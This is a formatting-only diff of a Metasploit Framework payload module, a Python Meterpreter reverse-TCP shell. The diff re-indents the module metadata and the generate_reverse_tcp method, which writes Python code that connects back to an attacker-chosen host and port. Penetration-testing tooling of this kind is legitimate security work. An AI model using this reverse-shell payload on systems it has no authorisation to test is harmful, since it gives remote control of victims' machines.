@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -14,20 +12,23 @@ module MetasploitModule
   include Msf::Payload::Python::MeterpreterLoader
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Python Meterpreter Shell, Reverse TCP Inline',
-      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
-      'Author'      => 'Spencer McIntyre',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'python',
-      'Arch'        => ARCH_PYTHON,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::Meterpreter_Python_Python
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Python Meterpreter Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
+        'Author' => 'Spencer McIntyre',
+        'License' => MSF_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Meterpreter_Python_Python
+      )
+    )
   end
 
-  def generate_reverse_tcp(opts={})
-    socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+  def generate_reverse_tcp(opts = {})
+    socket_setup = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
     opts[:stageless] = true
